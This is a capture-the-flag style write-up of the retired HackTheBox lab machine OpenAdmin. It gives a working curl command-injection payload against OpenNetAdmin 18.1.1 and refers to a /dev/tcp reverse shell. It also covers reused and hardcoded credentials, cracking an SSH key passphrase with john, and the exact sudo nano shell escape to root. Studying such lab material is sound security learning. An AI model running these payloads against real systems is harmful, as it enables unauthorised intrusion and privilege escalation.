---
layout: post
title: "The Password Wore Three Faces"
subtitle: "HTB OpenAdmin, where a dusty admin panel runs your command, a database password walks into a login, and a help-file editor hands you a root shell because someone trusted it to only edit one file"
date: 2020-05-09 12:00:00 +0000
description: "An old network-admin panel runs your command, a reused database password unlocks a user, a hardcoded login leaks an encrypted SSH key, and sudo nano hands over root."
image: /assets/og/the-password-wore-three-faces.png
tags: [hackthebox, writeup]
---

OpenAdmin is a box about a single password that keeps walking through doors it was never supposed to touch. It starts with a forgotten network-management panel old enough to run any command you mail it. From there the box is not really a hacking puzzle anymore. It is a paper trail. A database password lives in a config file, and that same password is also a man's login. A login panel has the next set of keys typed straight into its own source code. An encrypted SSH key sits behind that panel waiting for a passphrase you can guess. And at the very end, a text editor that someone let run as root because they only ever meant it to edit one little file. Nothing here is forced. Every lock opens because a secret got reused, written down, or trusted one inch too far.

```
        O P E N   A D M I N
        ===================
        /ona/   an old panel that runs your "ping"
                  |
                  v
        config file:  db password in plaintext
        same password is also jimmy's login
                  |
                  v
        a hidden site, creds typed into the source
        it hands out joanna's locked ssh key
                  |
                  v
        sudo nano /opt/priv  →  the editor opens a shell
        it was only ever meant to edit one file
                                            鍵
```

## 0x01 · the lobby

Two ports answer, and the box is not hiding much. A standard `nmap -sC -sV` paints a plain Ubuntu web host.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

SSH and a web server, nothing exotic. The default Apache landing page sits on 80, which means the interesting thing is somewhere deeper in the site, not on the front step. A quick directory brute with `gobuster` against the root turns up `/ona/`, and that little folder is the whole front half of the box.

## 0x02 · the panel that runs your errands

`/ona/` is OpenNetAdmin, a web tool for tracking IP addresses and network gear, and it cheerfully prints its own version on the dashboard. Version 18.1.1. That number is the tell, because 18.1.1 carries a remote code execution bug that needs no login at all.

Here is what went wrong, in plain terms. One of the panel's internal handlers takes a value you send it and pastes it straight into a shell command on the server. Picture a hotel concierge who writes down your room-service order and reads it word for word into the kitchen intercom without looking at it. Order a sandwich and you get a sandwich. Order "a sandwich; also unlock every door" and the kitchen hears two perfectly good instructions and starts on both. The panel never drew a line between "a value to look up" and "a command to run."

The public exploit for this is a one-line `curl`. You hit the panel's `dcm.php` handler with a crafted set of arguments, and the part after the semicolon runs on the server as whatever account Apache uses, which here is `www-data`.

```
$ curl -s 'http://10.10.10.171/ona/' \
    --data 'xajax=window_submit&xajaxr=1&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That `id` coming back proves the injection. Swap the harmless `id` for a real callback ([ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]), start a listener, and a `www-data` prompt drops into your lap. First move, no password, because the panel treated your errand like an order.

## 0x03 · the password that was also a login

`www-data` is a nobody account, so look where web apps always spill their guts, in the config files. OpenNetAdmin needs to reach its database, and the credentials for that sit in plaintext on disk.

```
www-data@openadmin:~$ cat /var/www/html/ona/local/config/database_settings.inc.php
...
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
...
```

On its own, `n1nj4W4rri0R!` only opens a database. But a password is a habit, not a fact, and people pour the same one into every form they meet. There are two real human users on this box, `jimmy` and `joanna`, and the database password is also jimmy's login. Think of it like finding the PIN for someone's bike lock and discovering it is also the code on their front door. Same four digits, two completely different things they were supposed to protect.

```
www-data@openadmin:~$ su jimmy
Password: n1nj4W4rri0R!
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy)
```

We are jimmy now, but jimmy does not own the user flag. That belongs to joanna, and getting there is the cleverest turn on the box.

## 0x04 · the door behind the wall

Jimmy can read parts of the web server config that `www-data` could not, and Apache is hosting more than the public site. The site definitions live in `/etc/apache2/sites-enabled`, and one of them is named exactly what you hope to find.

```
jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf
<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal
    ...
</VirtualHost>
```

Two facts jump out. The site only listens on `127.0.0.1`, so it is invisible from the outside, a door that opens only from inside the building. And critically, the vhost is configured to run its PHP as joanna, the very user we are trying to become. Whatever this hidden site can do, it does with joanna's hands.

Reading the source in `/var/www/internal` shows what it does. The `index.php` login page checks your credentials against values written directly into the code, in plaintext, no hashing, no database.

```
if ($_POST['username'] === 'joanna' && $_POST['password'] === 'joanna') {
    $_SESSION['username'] = 'joanna';
    header('Location: /main.php');
}
```

The username is `joanna` and so is the password. Picture a safe with the combination engraved on the front of the safe. And `main.php`, the page you reach after that login, prints joanna's SSH private key right onto the screen.

To actually reach the page, you tunnel. The site only answers on the box's own loopback, so forward that port back to yourself over jimmy's SSH session.

```
$ ssh jimmy@10.10.10.171 -L 52846:127.0.0.1:52846
# then browse to http://127.0.0.1:52846, log in joanna:joanna,
# and read main.php
```

Picture the tunnel as a long straw punched through the wall. The hidden room only has a window facing its own courtyard, so you run a straw from that window all the way back to your house and drink through it. To your browser, the box's private courtyard now sits on your own desk.

## 0x05 · the key that wanted a word

What `main.php` hands over is an RSA private key, but it is locked.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
...
```

`Proc-Type: 4,ENCRYPTED` means the key is useless without its passphrase. A private key with no passphrase is a house key; an encrypted one is a house key inside a small combination lockbox. You have the right key, you just have to guess the box. So crack it offline. `ssh2john` turns the key into a hash format `john` understands, then you throw a wordlist at it.

```
$ ssh2john joanna-enc > joanna.hash
$ john --wordlist=rockyou.txt joanna.hash
bloodninjas      (joanna-enc)
```

The passphrase is `bloodninjas`. Decrypt the key with that, fix its permissions, and SSH in as joanna directly.

```
$ openssl rsa -in joanna-enc -out joanna.key
Enter pass phrase for joanna-enc:  bloodninjas
$ chmod 600 joanna.key
$ ssh -i joanna.key joanna@10.10.10.171
joanna@openadmin:~$ cat user.txt
████████████████████████████████
```

## 0x06 · the editor that opened a shell

Joanna has the user flag, and the path to root is short. Always check what a user is allowed to run as somebody else.

```
joanna@openadmin:~$ sudo -l
User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Joanna can run `nano`, as root, with no password, on the file `/opt/priv`. Someone clearly meant this as a narrow gift. Let her edit one privileged file, nothing more. But a text editor is not a single-purpose tool. `nano` can read other files, write other files, and most fatally, shell out to run commands, and when you launch it through `sudo` every one of those powers runs as root.

This is the GTFObins move, a catalog of ordinary programs that can be bent into a shell when you run them with extra privilege. Open the file as instructed, then use nano's "read file" command, which lets you pipe in the output of a command. Run a shell that way and it inherits root.

```
joanna@openadmin:~$ sudo /bin/nano /opt/priv
# inside nano:
#   Ctrl+R  (read file), then  Ctrl+X  (run a command)
#   command:  reset; sh 1>&0 2>&0
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

Read that `id`. Not a buffer overflow, not a kernel exploit. An editor was handed the crown so it could touch one file, and an editor that can run commands can run anything. Think of it like giving the night janitor a master key so he can clean exactly one office. The key does not know about that promise. It opens every door he tries.

## 0x07 · the honest caveat

It is tempting to read OpenAdmin as four separate problems, but it is really one problem wearing four costumes. Almost every step is a secret that escaped the spot it was meant to live in. The database password was supposed to stay between the panel and its database, and it became a man's login. The internal login was supposed to be a gate, and the combination was carved into the gate. The SSH key was supposed to be protected by a passphrase, and the passphrase was a word in a list everyone has downloaded. The same human reflex runs underneath all of it. People reuse, hardcode, and under-protect secrets because the safe version is more work and the lazy version feels fine right up until it isn't.

And the root step is the one I would lose the most sleep over, because nothing there was unpatched. `sudo` did exactly what it was configured to do. The trap was a perfectly reasonable-sounding rule, "let joanna edit this one file as root," written by someone who thought of `nano` as a thing that edits text rather than a thing that runs programs. You cannot `apt upgrade` your way out of a `sudoers` line that trusts a Swiss Army knife to only ever be a screwdriver. The fix is not a patch. It is the discipline to ask, every single time, what else can this tool do when I hand it root, and to assume the answer is everything.

## 0x08 · outro

```
the panel ran your errand because it could not tell an order from a command.
the password opened a second lock because one person used it twice.
the gate had its own combination written on the front.
the editor opened a shell because it was only ever a door pretending to be a wall.

four locks, one key, copied until it fit them all.

reuse nothing. hardcode nothing. trust no tool past its one job. wear black.

                                                            EOF
```

---

*HTB: OpenAdmin, retired 2 May 2020. An easy Linux box that is really a lecture on what happens when one secret gets reused until it is root. The panel still runs your errands in a lab and nowhere you don't own.*